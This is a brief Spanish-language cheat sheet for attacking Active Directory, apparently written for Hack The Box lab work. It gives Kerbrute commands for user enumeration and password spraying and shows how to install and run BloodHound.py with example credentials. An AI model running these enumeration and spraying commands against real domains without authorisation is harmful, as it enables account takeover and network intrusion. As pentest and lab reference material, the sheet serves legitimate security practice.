# Active Directory CheatSheet

## Kerbrute

### Enumeración de usuarios

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt
```

### Password Spraying

```bash
sudo ntpdate 10.10.11.129
./kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local users.txt Password123
```

## BloodHound

### BloodHound.py

**Nota: Al recopilar la info con la última versión es recomendable usar a su vez también la última versión del visualizador.**

#### Setup

[Repositorio Github](https://github.com/fox-it/BloodHound.py)

```bash
pyenv ...
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python setup.py install
```

#### Uso

```bash
python bloodhound.py -u hope.sharp -p 'Password123' -d search.htb -ns 10.10.11.129 -c All
```